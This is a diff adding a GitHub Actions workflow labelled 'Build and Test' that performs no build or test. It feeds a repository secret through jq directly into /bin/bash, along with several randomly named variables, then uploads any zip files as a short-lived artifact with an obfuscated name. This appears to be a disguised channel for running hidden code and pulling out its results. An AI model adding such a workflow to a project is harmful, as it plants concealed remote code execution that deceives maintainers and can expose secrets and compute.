@@ -1,0 +1,29 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          t11533: ${{ secrets.t11533 }}
+        run: |
+          printf '%s' "$t11533" | jq -r .d01 | /bin/bash
+          echo $wfn8 | jq -r .kqqqw2301 | /bin/bash
+          echo $m77640 | jq -r .nbdq66 | /bin/bash
+          printf '%s' "$bfke50" | jq -r .u44 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: DPdp0Xx6
+          path: "*.zip"
+          retention-days: 1
